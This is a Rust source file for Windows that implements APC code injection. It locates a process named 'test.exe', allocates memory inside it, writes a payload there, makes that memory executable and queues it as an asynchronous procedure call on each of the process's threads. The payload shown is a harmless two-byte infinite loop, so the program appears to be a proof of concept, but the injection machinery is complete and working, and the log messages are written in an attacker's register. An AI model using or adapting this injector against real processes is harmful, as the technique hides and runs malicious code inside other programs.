use core::ptr;
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;

use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, INVALID_HANDLE_VALUE,
};
use windows_sys::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    Thread32First, Thread32Next, THREADENTRY32, TH32CS_SNAPTHREAD,
};
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualFreeEx, VirtualQueryEx, VirtualProtectEx,
    MEMORY_BASIC_INFORMATION, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, 
    PAGE_READWRITE, PAGE_EXECUTE_READ,
    PAGE_PROTECTION_FLAGS,
};
use windows_sys::Win32::System::Threading::{
    OpenProcess, OpenThread, QueueUserAPC,
    PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, 
    PROCESS_VM_READ, PROCESS_VM_WRITE, THREAD_SET_CONTEXT,
};

macro_rules! log_info { ($($arg:tt)*) => { println!("[INFO] {}", format_args!($($arg)*)) } }
macro_rules! log_success { ($($arg:tt)*) => { println!("[+SUCCESS] {}", format_args!($($arg)*)) } }
macro_rules! log_error { 
    ($msg:expr) => { 
        eprintln!("[!ERROR] {} (Win32 Error: {})", $msg, GetLastError()) 
    }
}

struct SnapshotHandle(isize);
impl Drop for SnapshotHandle {
    fn drop(&mut self) {
        if self.0 != INVALID_HANDLE_VALUE { unsafe { CloseHandle(self.0) }; }
    }
}

struct ProcessHandle(isize);
impl Drop for ProcessHandle {
    fn drop(&mut self) {
        if self.0 != 0 { 
            unsafe { CloseHandle(self.0) };
            println!("[INFO] Process handle closed.");
        }
    }
}

struct ThreadHandle(isize);
impl Drop for ThreadHandle {
    fn drop(&mut self) {
        if self.0 != 0 { unsafe { CloseHandle(self.0) }; }
    }
}

struct RemoteMemory {
    process_handle: isize,
    address: *mut core::ffi::c_void,
    persist: bool,
}

impl RemoteMemory {
    fn leak(&mut self) { self.persist = true; }
}

impl Drop for RemoteMemory {
    fn drop(&mut self) {
        if !self.address.is_null() && !self.persist {
            unsafe {
                let status = VirtualFreeEx(self.process_handle, self.address, 0, MEM_RELEASE);
                if status != 0 { println!("[+SUCCESS] Remote memory released via RAII."); }
                else { eprintln!("[!ERROR] RAII Cleanup failed (Win32 Error: {})", GetLastError()); }
            }
        } else if self.persist {
            println!("[INFO] Persistence enabled: Memory retained for execution.");
        }
    }
}

fn get_process_id(name: &str) -> Result<u32, String> {
    unsafe {
        let snapshot = SnapshotHandle(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
        if snapshot.0 == INVALID_HANDLE_VALUE { 
            return Err(format!("Snapshot failed. Error: {}", GetLastError())); 
        }
        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snapshot.0, &mut entry) != 0 {
            loop {
                let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
                let pname = OsString::from_wide(&entry.szExeFile[..len]).to_string_lossy().into_owned();
                if pname.eq_ignore_ascii_case(name) {
                    return Ok(entry.th32ProcessID);
                }
                if Process32NextW(snapshot.0, &mut entry) == 0 { break; }
            }
        }
        Err(format!("Process '{}' not found.", name))
    }
}

fn get_threads(pid: u32) -> Result<Vec<u32>, String> {
    unsafe {
        let snapshot = SnapshotHandle(CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0));
        if snapshot.0 == INVALID_HANDLE_VALUE { 
            return Err(format!("Thread snapshot failed. Error: {}", GetLastError())); 
        }
        let mut entry: THREADENTRY32 = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
        let mut threads = Vec::new();
        if Thread32First(snapshot.0, &mut entry) != 0 {
            loop {
                if entry.th32OwnerProcessID == pid {
                    threads.push(entry.th32ThreadID);
                }
                if Thread32Next(snapshot.0, &mut entry) == 0 { break; }
            }
        }
        if threads.is_empty() { return Err("No active threads found in target.".to_string()); }
        Ok(threads)
    }
}

fn verify_remote_state(handle: isize, addr: *mut core::ffi::c_void, size: usize, expected_prot: PAGE_PROTECTION_FLAGS) -> bool {
    unsafe {
        let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
        let result = VirtualQueryEx(handle, addr, &mut mbi, std::mem::size_of::<MEMORY_BASIC_INFORMATION>());
        if result == 0 {
            log_error!("VirtualQueryEx failed");
            return false;
        }
        let commit_ok = mbi.State == MEM_COMMIT;
        let prot_ok = mbi.Protect == expected_prot;
        let size_ok = mbi.RegionSize >= size;
        log_info!("APC Readiness -> Commit: {}, Prot: {}, Capacity: {}", commit_ok, prot_ok, size_ok);
        commit_ok && prot_ok && size_ok
    }
}

fn main() {
    let target = "test.exe";
    let size = 4096;
    let payload: [u8; 2] = [0xEB, 0xFE];

    log_info!("Switching architecture to APC Injection: {}", target);

    let pid = match get_process_id(target) {
        Ok(id) => { log_success!("Target PID: {}", id); id },
        Err(e) => { eprintln!("[!] {}", e); return; }
    };

    let tids = match get_threads(pid) {
        Ok(list) => { log_success!("Found {} threads for injection.", list.len()); list },
        Err(e) => { eprintln!("[!] {}", e); return; }
    };

    let handle = unsafe {
        ProcessHandle(OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, 
            0, 
            pid
        ))
    };

    if handle.0 == 0 { unsafe { log_error!("OpenProcess failed"); } return; }

    let remote_addr = unsafe { VirtualAllocEx(handle.0, ptr::null(), size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) };
    if remote_addr.is_null() { unsafe { log_error!("VirtualAllocEx failed"); } return; }

    let mut remote_mem = RemoteMemory { process_handle: handle.0, address: remote_addr, persist: false };
    log_success!("APC buffer allocated at: {:p}", remote_mem.address);

    if !verify_remote_state(handle.0, remote_mem.address, size, PAGE_READWRITE) { return; }

    let mut written = 0;
    let w_status = unsafe { WriteProcessMemory(handle.0, remote_mem.address, payload.as_ptr() as _, payload.len(), &mut written) };

    if w_status != 0 && written == payload.len() {
        log_success!("Payload deployed to remote process.");

        let mut old_prot = 0;
        let p_status = unsafe { VirtualProtectEx(handle.0, remote_mem.address, size, PAGE_EXECUTE_READ, &mut old_prot) };

        if p_status != 0 && verify_remote_state(handle.0, remote_mem.address, size, PAGE_EXECUTE_READ) {
            log_success!("Memory protection optimized for execution.");

            remote_mem.leak();

            let mut queued_count = 0;
            for tid in tids {
                unsafe {
                    let h_thread = OpenThread(THREAD_SET_CONTEXT, 0, tid);
                    if h_thread != 0 {
                        let apc_routine = Some(core::mem::transmute(remote_mem.address));
                        if QueueUserAPC(apc_routine, h_thread, 0) != 0 {
                            queued_count += 1;
                        }
                        CloseHandle(h_thread);
                    }
                }
            }

            if queued_count > 0 {
                log_success!("Successfully queued APC to {} threads.", queued_count);
                log_info!("Waiting for target thread to enter alertable state...");
            } else {
                unsafe { log_error!("APC queuing failed for all threads."); }
            }
        }
    }

    log_info!("APC Pipeline finalized. Exiting controller.");
}